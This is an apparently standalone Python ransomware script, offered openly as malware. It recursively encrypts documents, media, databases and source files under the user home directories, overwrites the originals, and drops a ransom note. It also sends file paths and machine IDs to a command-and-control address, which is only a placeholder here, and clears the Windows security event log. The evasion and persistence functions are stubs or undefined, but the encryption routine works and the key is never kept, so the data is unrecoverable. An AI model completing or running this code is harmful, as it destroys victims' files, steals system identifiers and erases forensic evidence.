#!/usr/bin/env python3
import os
import sys
import base64
import json
import ctypes
import tempfile
import platform
import hashlib
import threading
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import subprocess
import requests
import socket
import time

# === CONFIGURATION ===
C2_SERVER = "lol://youredone"
RANSOM_NOTE = """YOUR FILES HAVE BEEN ENCRYPTED!
You can NEVER restore them! mwa ha ha!"""

# === EVASION TECHNIQUES ===
def check_debugger():
    pass

def sandbox_checks():
    pass
# === C2 COMMUNICATION ===
class C2Comm:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        
    def exfiltrate_data(self, data):
        """Send encrypted data to C2"""
        try:
            # XOR "encryption" for C2 comms
            key = b'4dnx7t5n734ndgyxngt3dngiyxniyge'
            encrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
            self.session.post(
                C2_SERVER,
                files={'data': encrypted},
                timeout=10
            )
        except:
            pass

# === MAIN RANSOMWARE CLASS ===
class Ransomware:
    def __init__(self):
        check_debugger()
        sandbox_checks()
        self.key = base64.b64encode(os.urandom(32)).decode('utf-8')
        self.c2 = C2Comm()
        self.mutex = self._create_mutex()
        
    def _create_mutex(self):
        """Prevent multiple instances"""
        if platform.system() == 'Windows':
            try:
                mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\RansomwareMutex")
                if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
                    sys.exit(0)
                return mutex
            except:
                pass
        return None

    def encrypt_files(self):
        """Threaded file encryption"""
        for root, _, files in os.walk(self._get_start_path()):
            for file in files:
                if any(file.lower().endswith(ext) for ext in [
                  '.txt', '.doc', '.docx', '.pdf', '.jpg', '.jpeg', '.png', 
                  '.mp3', '.mp4', '.zip', '.sql', '.db', '.xls', '.xlsx', 
                  '.ppt', '.pptx', '.csv', '.py', '.js', '.html', '.css', 
                  '.cpp', '.c', '.java', '.php', '.rb', '.go', '.rs'
                ]):
                    filepath = Path(root) / file
                    thread = threading.Thread(
                        target=self._encrypt_file,
                        args=(filepath,)
                    )
                    thread.start()

    def _get_start_path(self):
        """Get platform-specific start path"""
        if platform.system() == 'Windows':
            return 'C:\\Users'
        elif platform.system() == 'Darwin':
            return '/Users'
        else:
            return '/home'

    def _encrypt_file(self, filepath):
        """Encrypt file with AES-256-CBC and ransom note"""
        try:
            iv = os.urandom(16)
            cipher = AES.new(base64.b64decode(self.key), AES.MODE_CBC, iv)
            
            with open(filepath, 'rb') as f:
                plaintext = f.read()
            
            ciphertext = iv + cipher.encrypt(pad(plaintext, AES.block_size))
            
            with open(filepath, 'wb') as f:
                f.write(ciphertext)
            
            # Drop ransom note in directory
            ransom_path = filepath.parent / "DECRYPT_INSTRUCTIONS.txt"
            if not ransom_path.exists():
                with open(ransom_path, 'w') as f:
                    f.write(RANSOM_NOTE)
            
            # Exfil file metadata to C2
            self.c2.exfiltrate_data(json.dumps({
                'file': str(filepath),
                'machine_id': self._get_machine_id(),
                'timestamp': time.time()
            }).encode())
            
        except Exception as e:
            pass  # Silent fail for operational security

    def _get_machine_id(self):
        """Get unique system identifier"""
        if platform.system() == 'Windows':
            return subprocess.check_output(
                'wmic csproduct get uuid',
                shell=True,
                stderr=subprocess.DEVNULL
            ).decode().split('\n')[1].strip()
        elif platform.system() == 'Linux':
            try:
                with open('/etc/machine-id') as f:
                    return f.read().strip()
            except:
                return socket.gethostname()
        else:  # MacOS
            return subprocess.check_output(
                'ioreg -rd1 -c IOPlatformExpertDevice | grep IOPlatformUUID',
                shell=True
            ).decode().split('=')[1].strip().strip('"')

    def cleanup(self):
        """Remove forensic artifacts"""
        if platform.system() == 'Windows':
            subprocess.run(
                'wevtutil cl security',
                shell=True,
                stderr=subprocess.DEVNULL
            )
        # Remove temporary files
        tmp_dir = tempfile.gettempdir()
        for f in os.listdir(tmp_dir):
            if f.startswith('tmp_ransom'):
                os.remove(os.path.join(tmp_dir, f))

# === EXECUTION FLOW ===
if __name__ == '__main__':
    try:
        # Privilege escalation attempt
        if os.getuid() != 0 and platform.system() != 'Windows':
            sudo_cache = '/var/db/sudo/ts'
            if os.path.exists(sudo_cache):
                try:
                    os.utime(sudo_cache, None)  # Poison sudo timestamp
                except:
                    pass

        # Install persistence
        install_persistence()
        
        # Main ransomware execution
        ransomware = Ransomware()
        ransomware.encrypt_files()
        
        # Cleanup
        ransomware.cleanup()
        
    except Exception as e:
        pass
